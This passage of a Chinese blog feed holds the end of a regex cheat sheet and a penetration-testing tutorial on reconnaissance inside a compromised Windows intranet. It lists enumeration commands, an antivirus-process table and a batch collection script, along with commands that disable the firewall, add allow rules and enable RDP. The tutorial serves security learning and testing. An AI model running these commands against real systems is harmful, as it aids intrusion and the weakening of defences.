align="center">当该字符紧跟在任何一个其他限制符（*,+,?，{<em>n</em>}，{<em>n</em>,}，{<em>n</em>,<em>m</em>}）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串“<code>oooo</code>“，”<code>o+?</code>“将匹配单个”<code>o</code>“，而”<code>o+</code>“将匹配所有”<code>o</code>“。</td></tr><tr><td align="center">.</td><td align="center">匹配除“<code>\</code><em><code>n</code></em>“之外的任何单个字符。要匹配包括”<code>\</code><em><code>n</code></em>“在内的任何字符，请使用像”`(.</td></tr><tr><td align="center">(pattern)</td><td align="center">匹配pattern并获取这一匹配。所获取的匹配可以从产生的Matches集合得到，在VBScript中使用SubMatches集合，在JScript中则使用$0…$9属性。要匹配圆括号字符，请使用“<code>\(</code>“或”<code>\)</code>“。</td></tr><tr><td align="center">(?:pattern)</td><td align="center">匹配pattern但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用或字符“`(</td></tr><tr><td align="center">(?=pattern)</td><td align="center">正向肯定预查，在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，“`Windows(?=95</td></tr><tr><td align="center">(?!pattern)</td><td align="center">正向否定预查，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如“`Windows(?!95</td></tr><tr><td align="center">(?&lt;=pattern)</td><td align="center">反向肯定预查，与正向肯定预查类拟，只是方向相反。例如，“`(?&lt;=95</td></tr><tr><td align="center">(?&lt;!pattern)</td><td align="center">反向否定预查，与正向否定预查类拟，只是方向相反。例如“`(?&lt;!95</td></tr><tr><td align="center">x|y</td><td align="center">匹配x或y。例如，“`z</td></tr><tr><td align="center">[xyz]</td><td align="center">字符集合。匹配所包含的任意一个字符。例如，“<code>[abc]</code>“可以匹配”<code>plain</code>“中的”<code>a</code>“。</td></tr><tr><td align="center">[^xyz]</td><td align="center">负值字符集合。匹配未包含的任意字符。例如，“<code>[^abc]</code>“可以匹配”<code>plain</code>“中的”<code>p</code>“。</td></tr><tr><td align="center">[a-z]</td><td align="center">字符范围。匹配指定范围内的任意字符。例如，“<code>[a-z]</code>“可以匹配”<code>a</code>“到”<code>z</code>“范围内的任意小写字母字符。</td></tr><tr><td align="center">[^a-z]</td><td align="center">负值字符范围。匹配任何不在指定范围内的任意字符。例如，“<code>[^a-z]</code>“可以匹配任何不在”<code>a</code>“到”<code>z</code>“范围内的任意字符。</td></tr><tr><td align="center">\b</td><td align="center">匹配一个单词边界，也就是指单词和空格间的位置。例如，“<code>er\b</code>“可以匹配”<code>never</code>“中的”<code>er</code>“，但不能匹配”<code>verb</code>“中的”<code>er</code>“。</td></tr><tr><td align="center">\B</td><td align="center">匹配非单词边界。“<code>er\B</code>“能匹配”<code>verb</code>“中的”<code>er</code>“，但不能匹配”<code>never</code>“中的”<code>er</code>“。</td></tr><tr><td align="center">\cx</td><td align="center">匹配由x指明的控制字符。例如，\cM匹配一个Control-M或回车符。x的值必须为A-Z或a-z之一。否则，将c视为一个原义的“<code>c</code>“字符。</td></tr><tr><td align="center">\d</td><td align="center">匹配一个数字字符。等价于[0-9]。</td></tr><tr><td align="center">\D</td><td align="center">匹配一个非数字字符。等价于[^0-9]。</td></tr><tr><td align="center">\f</td><td align="center">匹配一个换页符。等价于\x0c和\cL。</td></tr><tr><td align="center">\n</td><td align="center">匹配一个换行符。等价于\x0a和\cJ。</td></tr><tr><td align="center">\r</td><td align="center">匹配一个回车符。等价于\x0d和\cM。</td></tr><tr><td align="center">\s</td><td align="center">匹配任何空白字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。</td></tr><tr><td align="center">\S</td><td align="center">匹配任何非空白字符。等价于[^ \f\n\r\t\v]。</td></tr><tr><td align="center">\t</td><td align="center">匹配一个制表符。等价于\x09和\cI。</td></tr><tr><td align="center">\v</td><td align="center">匹配一个垂直制表符。等价于\x0b和\cK。</td></tr><tr><td align="center">\w</td><td align="center">匹配包括下划线的任何单词字符。等价于“<code>[A-Za-z0-9_]</code>“。</td></tr><tr><td align="center">\W</td><td align="center">匹配任何非单词字符。等价于“<code>[^A-Za-z0-9_]</code>“。</td></tr><tr><td align="center">\x<em>n</em></td><td align="center">匹配<em>n</em>，其中<em>n</em>为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，“<code>\x41</code>“匹配”<code>A</code>“。”<code>\x041</code>“则等价于”<code>\x04&amp;1</code>“。正则表达式中可以使用ASCII编码。.</td></tr><tr><td align="center">*num*</td><td align="center">匹配<em>num</em>，其中<em>num</em>是一个正整数。对所获取的匹配的引用。例如，“<code>(.)\1</code>“匹配两个连续的相同字符。</td></tr><tr><td align="center">*n*</td><td align="center">标识一个八进制转义值或一个向后引用。如果*n<em>之前至少</em>n<em>个获取的子表达式，则</em>n<em>为向后引用。否则，如果</em>n<em>为八进制数字（0-7），则</em>n*为一个八进制转义值。</td></tr><tr><td align="center">*nm*</td><td align="center">标识一个八进制转义值或一个向后引用。如果*nm<em>之前至少有</em>nm<em>个获得子表达式，则</em>nm<em>为向后引用。如果*nm</em>之前至少有<em>n</em>个获取，则<em>n</em>为一个后跟文字<em>m</em>的向后引用。如果前面的条件都不满足，若<em>n</em>和<em>m</em>均为八进制数字（0-7），则*nm<em>将匹配八进制转义值</em>nm*。</td></tr><tr><td align="center">*nml*</td><td align="center">如果<em>n</em>为八进制数字（0-3），且<em>m和l</em>均为八进制数字（0-7），则匹配八进制转义值<em>nm</em>l。</td></tr><tr><td align="center">\u<em>n</em></td><td align="center">匹配<em>n</em>，其中<em>n</em>是一个用四个十六进制数字表示的Unicode字符。例如，\u00A9匹配版权符号（©）。</td></tr></tbody></table><h1 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="常用正则表达式"></a>常用正则表达式</h1><table><thead><tr><th align="center">用户名</th><th>/^[a-z0-9_-]{3,16}$/</th></tr></thead><tbody><tr><td align="center">密码</td><td>/^[a-z0-9_-]{6,18}$/</td></tr><tr><td align="center">密码2</td><td>(?=^.{8,}$)(?=.<em>\d)(?=.<em>\W+)(?=.</em>[A-Z])(?=.</em>[a-z])(?!.<em>\n).</em>$ (由数字/大写字母/小写字母/标点符号组成，四种都必有，8位以上)</td></tr><tr><td align="center">十六进制值</td><td>/^#?([a-f0-9]{6}|[a-f0-9]{3})$/</td></tr><tr><td align="center">电子邮箱</td><td>/^([a-z0-9_.-]+)@([\da-z.-]+).([a-z.]{2,6})$/ /^[a-z\d]+(.[a-z\d]+)<em>@(<a href="-%5B%5Cda-z%5D">\da-z</a>?)+(.{1,2}[a-z]+)+$/或\w+([-+.]\w+)</em>@\w+([-.]\w+)<em>.\w+([-.]\w+)</em></td></tr><tr><td align="center">URL</td><td>/^(https?://)?([\da-z.-]+).([a-z.]{2,6})([/\w .-]*)<em>/?$/ 或 [a-zA-z]+://[^\s]</em></td></tr><tr><td align="center">IP 地址</td><td>/((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)/ /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/ 或 ((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)</td></tr><tr><td align="center">HTML 标签</td><td>/^&lt;([a-z]+)([^&lt;]+)<em>(?:&gt;(.</em>)&lt;/\1&gt;|\s+/&gt;)$/或&lt;(.<em>)(.*)&gt;.</em>&lt;/\1&gt;|&lt;(.*) /&gt;</td></tr><tr><td align="center">删除代码\注释</td><td>(?&lt;!http:|\S)//.*$</td></tr><tr><td align="center">匹配双字节字符(包括汉字在内)</td><td>[^\x00-\xff]</td></tr><tr><td align="center">汉字(字符)</td><td>[\u4e00-\u9fa5]</td></tr><tr><td align="center">Unicode编码中的汉字范围</td><td>/^[\u2E80-\u9FFF]+$/</td></tr><tr><td align="center">中文及全角标点符号(字符)</td><td>[\u3000-\u301e\ufe10-\ufe19\ufe30-\ufe44\ufe50-\ufe6b\uff01-\uffee]</td></tr><tr><td align="center">日期(年-月-日)</td><td>(\d{4}|\d{2})-((0?([1-9]))|(1[1|2]))-((0?[1-9])|(<a href="%5B1-9%5D">12</a>)|(3[0|1]))</td></tr><tr><td align="center">日期(月/日/年)</td><td>((0?[1-9]{1})|(1[1|2]))/(0?[1-9]|([12][1-9])|(3[0|1]))/(\d{4}|\d{2})</td></tr><tr><td align="center">时间(小时:分钟, 24小时制)</td><td>((1|0?)[0-9]|2[0-3]):([0-5][0-9])</td></tr><tr><td align="center">中国大陆固定电话号码</td><td>(\d{4}-|\d{3}-)?(\d{8}|\d{7})</td></tr><tr><td align="center">中国大陆手机号码</td><td>1\d{10}</td></tr><tr><td align="center">中国大陆邮政编码</td><td>[1-9]\d{5}</td></tr><tr><td align="center">中国大陆身份证号(15位或18位)</td><td>\d{15}(\d\d[0-9xX])?</td></tr><tr><td align="center">非负整数(正整数或零)</td><td>\d+</td></tr><tr><td align="center">正整数</td><td>[0-9]<em>[1-9][0-9]</em></td></tr><tr><td align="center">负整数</td><td>-[0-9]<em>[1-9][0-9]</em></td></tr><tr><td align="center">整数</td><td>-?\d+</td></tr><tr><td align="center">小数</td><td>(-?\d+)(.\d+)?</td></tr><tr><td align="center">空白行</td><td>\n\s*\r 或者 \n\n(editplus) 或者 ^[\s\S ]*\n</td></tr><tr><td align="center">QQ号码</td><td>[1-9]\d{4,}</td></tr><tr><td align="center">不包含abc的单词</td><td>\b((?!abc)\w)+\b</td></tr><tr><td align="center">匹配首尾空白字符</td><td>^\s*|\s*$</td></tr><tr><td align="center">编辑常用</td><td>以下是针对特殊中文的一些替换(editplus) ^[0-9].*\n  ^[^第].<em>\n  ^[习题].<em>\n ^[\s\S ]<em>\n ^[0-9]<em>. ^[\s\S ]<em>\n &lt;p[^&lt;&gt;</em>]&gt;href=”javascript:if(confirm(‘(.</em>?)’))window.location=’(.</em>?)’”&lt;span style=”.[^”]*rgb(255,255,255)“&gt;.[^&lt;&gt;]</em></span>  <DIV class=xs0>[\s\S]</em>?</DIV></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 速查 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
            <tag> re </tag>
            
            <tag> 速查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2-内网信息收集</title>
      <link href="/2021/09/15/2-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2021/09/15/2-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="内网信息收集的目的"><a href="#内网信息收集的目的" class="headerlink" title="内网信息收集的目的"></a>内网信息收集的目的</h1><h2 id="我是谁？"><a href="#我是谁？" class="headerlink" title="我是谁？"></a>我是谁？</h2><p>判断当前机器的角色，是普通Web服务器还是文件服务器、代理服务器、DNS服务器等。</p><h2 id="这是哪？"><a href="#这是哪？" class="headerlink" title="这是哪？"></a>这是哪？</h2><p>对网络环境的拓扑结构进行分析整理，绘制出大致的拓扑结构图。</p><h2 id="我在哪？"><a href="#我在哪？" class="headerlink" title="我在哪？"></a>我在哪？</h2><p>判断当前机器所处区域，即处于DMZ、办公区还是核心区。不同的真实环境中情况不一样，只是做一个大概的判断。</p><h1 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h1><h2 id="Windows平台"><a href="#Windows平台" class="headerlink" title="Windows平台"></a>Windows平台</h2><h3 id="查询网络配置"><a href="#查询网络配置" class="headerlink" title="查询网络配置"></a>查询网络配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure><h3 id="查询操作系统和版本、补丁等信息"><a href="#查询操作系统和版本、补丁等信息" class="headerlink" title="查询操作系统和版本、补丁等信息"></a>查询操作系统和版本、补丁等信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><h3 id="收集所装所有软件的版本信息"><a href="#收集所装所有软件的版本信息" class="headerlink" title="收集所装所有软件的版本信息"></a>收集所装所有软件的版本信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;get-wmiobject -class win32_product | select-object -property name,version&quot;</span><br></pre></td></tr></table></figure><h3 id="收集本机服务的信息"><a href="#收集本机服务的信息" class="headerlink" title="收集本机服务的信息"></a>收集本机服务的信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><h3 id="查看进程信息"><a href="#查看进程信息" class="headerlink" title="查看进程信息"></a>查看进程信息</h3><h4 id="查看进程和用户的对应关系"><a href="#查看进程和用户的对应关系" class="headerlink" title="查看进程和用户的对应关系"></a>查看进程和用户的对应关系</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><h4 id="查看进程的详细信息"><a href="#查看进程的详细信息" class="headerlink" title="查看进程的详细信息"></a>查看进程的详细信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><h4 id="常见杀毒软件进程信息"><a href="#常见杀毒软件进程信息" class="headerlink" title="常见杀毒软件进程信息"></a>常见杀毒软件进程信息</h4><table><thead><tr><th align="center">进程</th><th align="center">名称</th></tr></thead><tbody><tr><td align="center">360sd.exe</td><td align="center">360杀毒</td></tr><tr><td align="center">360ray.exe</td><td align="center">360实时保护</td></tr><tr><td align="center">ZhuDongFangYu.exe</td><td align="center">360主动防御</td></tr><tr><td align="center">KSafeTray.exe</td><td align="center">金山卫士</td></tr><tr><td align="center">SafeDogUpdateCenter.exe</td><td align="center">服务器安全狗</td></tr><tr><td align="center">McAfee McShield.exe</td><td align="center">McAfee</td></tr><tr><td align="center">egui.exe</td><td align="center">NOD32</td></tr><tr><td align="center">AVP.exe</td><td align="center">卡巴斯基</td></tr><tr><td align="center">avguard.exe</td><td align="center">小红伞</td></tr><tr><td align="center">bdagent.exe</td><td align="center">BitDefender</td></tr></tbody></table><h3 id="查看正在运行的程序的信息"><a href="#查看正在运行的程序的信息" class="headerlink" title="查看正在运行的程序的信息"></a>查看正在运行的程序的信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><h3 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><h3 id="查看主机开机时间与统计信息"><a href="#查看主机开机时间与统计信息" class="headerlink" title="查看主机开机时间与统计信息"></a>查看主机开机时间与统计信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><h3 id="查看用户信息"><a href="#查看用户信息" class="headerlink" title="查看用户信息"></a>查看用户信息</h3><h4 id="查看本机用户列表"><a href="#查看本机用户列表" class="headerlink" title="查看本机用户列表"></a>查看本机用户列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><h4 id="获取本地管理员（通常也会包含有域用户）信息"><a href="#获取本地管理员（通常也会包含有域用户）信息" class="headerlink" title="获取本地管理员（通常也会包含有域用户）信息"></a>获取本地管理员（通常也会包含有域用户）信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><h4 id="查看当前在线用户"><a href="#查看当前在线用户" class="headerlink" title="查看当前在线用户"></a>查看当前在线用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user | qwinsta</span><br></pre></td></tr></table></figure><h3 id="查询本机与所连接的客户端之间的会话"><a href="#查询本机与所连接的客户端之间的会话" class="headerlink" title="查询本机与所连接的客户端之间的会话"></a>查询本机与所连接的客户端之间的会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="查询端口与服务、程序的对应列表"><a href="#查询端口与服务、程序的对应列表" class="headerlink" title="查询端口与服务、程序的对应列表"></a>查询端口与服务、程序的对应列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><h3 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a>查询本机共享列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><h3 id="查询路由表"><a href="#查询路由表" class="headerlink" title="查询路由表"></a>查询路由表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure><h3 id="查询ARP缓存表"><a href="#查询ARP缓存表" class="headerlink" title="查询ARP缓存表"></a>查询ARP缓存表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp  -a</span><br></pre></td></tr></table></figure><h3 id="防火墙相关"><a href="#防火墙相关" class="headerlink" title="防火墙相关"></a>防火墙相关</h3><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h4 id="查看防火墙配置"><a href="#查看防火墙配置" class="headerlink" title="查看防火墙配置"></a>查看防火墙配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><h4 id="修改防火墙配置"><a href="#修改防火墙配置" class="headerlink" title="修改防火墙配置"></a>修改防火墙配置</h4><h5 id="允许指定程序进入"><a href="#允许指定程序进入" class="headerlink" title="允许指定程序进入"></a>允许指定程序进入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name-&quot;规则名称&quot; dir=in action-allow program=&quot;程序路径&quot;</span><br></pre></td></tr></table></figure><h5 id="允许指定程序退出"><a href="#允许指定程序退出" class="headerlink" title="允许指定程序退出"></a>允许指定程序退出</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name-&quot;规则名称&quot; dir=out action-allow program=&quot;程序路径&quot;</span><br></pre></td></tr></table></figure><h5 id="允许指定端口放行"><a href="#允许指定端口放行" class="headerlink" title="允许指定端口放行"></a>允许指定端口放行</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name-&quot;规则名称&quot; protocol=TCP dir=in localport=端口号 action=allow</span><br></pre></td></tr></table></figure><h5 id="自定义防火墙日志的存储位置"><a href="#自定义防火墙日志的存储位置" class="headerlink" title="自定义防火墙日志的存储位置"></a>自定义防火墙日志的存储位置</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;路径&quot;</span><br></pre></td></tr></table></figure><h3 id="查看代理设置"><a href="#查看代理设置" class="headerlink" title="查看代理设置"></a>查看代理设置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><h3 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a>查询并开启远程连接服务</h3><p>每台机器不一定一样，反正就是修改注册表</p><h4 id="查询示例-win-server-2003"><a href="#查询示例-win-server-2003" class="headerlink" title="查询示例(win server 2003)"></a>查询示例(win server 2003)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&quot; /V PortNumber</span><br></pre></td></tr></table></figure><h4 id="开启3389端口示例-win-server-2003"><a href="#开启3389端口示例-win-server-2003" class="headerlink" title="开启3389端口示例(win server 2003)"></a>开启3389端口示例(win server 2003)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnnections 1</span><br></pre></td></tr></table></figure><h3 id="自动化信息收集工具"><a href="#自动化信息收集工具" class="headerlink" title="自动化信息收集工具"></a>自动化信息收集工具</h3><p><code>wmic_info.bat</code>脚本运行后会自动生成<code>out.html</code>，记录了各种信息。</p><p>脚本代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;delims=&quot;</span> %%A <span class="keyword">in</span> (<span class="string">&#x27;dir /s /b %WINDIR%\system32\*htable.xsl&#x27;</span>) <span class="keyword">do</span> <span class="built_in">set</span> <span class="string">&quot;var=%%A&quot;</span></span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic group list full /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic nicconfig <span class="built_in">where</span> IPEnabled=<span class="string">&#x27;true&#x27;</span> get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br></pre></td></tr></table></figure><p><a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">下载链接</a></p><h1 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h1><h2 id="查看权限并获取域SID"><a href="#查看权限并获取域SID" class="headerlink" title="查看权限并获取域SID"></a>查看权限并获取域SID</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><h2 id="查看指定用户的详细信息，包括本地权限组等"><a href="#查看指定用户的详细信息，包括本地权限组等" class="headerlink" title="查看指定用户的详细信息，包括本地权限组等"></a>查看指定用户的详细信息，包括本地权限组等</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user 用户名 /domain</span><br></pre></td></tr></table></figure><h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><h3 id="查询网络信息"><a href="#查询网络信息" class="headerlink" title="查询网络信息"></a>查询网络信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><h3 id="解析域名得到地址，对比域控制器和DNS服务器是否在同一台服务器上"><a href="#解析域名得到地址，对比域控制器和DNS服务器是否在同一台服务器上" class="headerlink" title="解析域名得到地址，对比域控制器和DNS服务器是否在同一台服务器上"></a>解析域名得到地址，对比域控制器和DNS服务器是否在同一台服务器上</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup 域名</span><br></pre></td></tr></table></figure><h3 id="查询系统信息，例如是否在域内"><a href="#查询系统信息，例如是否在域内" class="headerlink" title="查询系统信息，例如是否在域内"></a>查询系统信息，例如是否在域内</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>如果‘域’为‘workgroup’则说明不在域内</p><h3 id="查询当前登录域及登录用户的信息"><a href="#查询当前登录域及登录用户的信息" class="headerlink" title="查询当前登录域及登录用户的信息"></a>查询当前登录域及登录用户的信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p>回显有以下三种情况</p><ul><li>存在域但当前用户不是域用户：拒绝访问</li><li>存在域且当前用户是域用户：命令成功完成</li><li>当前处于工作组内，不存在域：找不到workgroup的域控制器</li></ul><h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><h3 id="使用nbtscan扫描，将脚本上传到主机并执行扫描"><a href="#使用nbtscan扫描，将脚本上传到主机并执行扫描" class="headerlink" title="使用nbtscan扫描，将脚本上传到主机并执行扫描"></a>使用nbtscan扫描，将脚本上传到主机并执行扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbt.exe 192.168.1.0/20</span><br></pre></td></tr></table></figure><h3 id="使用ICMP协议ping来循环探测整个C段"><a href="#使用ICMP协议ping来循环探测整个C段" class="headerlink" title="使用ICMP协议ping来循环探测整个C段"></a>使用ICMP协议ping来循环探测整个C段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ($i=0;$i -lt 255;$i++)&#123; ping -w 1 -n 1 &quot;192.168.1.$i&quot; | findstr &quot;TTL=&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="通过ARP扫描探测内网"><a href="#通过ARP扫描探测内网" class="headerlink" title="通过ARP扫描探测内网"></a>通过ARP扫描探测内网</h3><p>上传arp-scan工具，并执行，与nbtscan使用方法类似</p><h2 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h2><h3 id="telnet命令"><a href="#telnet命令" class="headerlink" title="telnet命令"></a>telnet命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 主机 端口</span><br></pre></td></tr></table></figure><h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><h3 id="PowerSploit的Invoke-portscan-ps1脚本"><a href="#PowerSploit的Invoke-portscan-ps1脚本" class="headerlink" title="PowerSploit的Invoke-portscan.ps1脚本"></a>PowerSploit的Invoke-portscan.ps1脚本</h3><h3 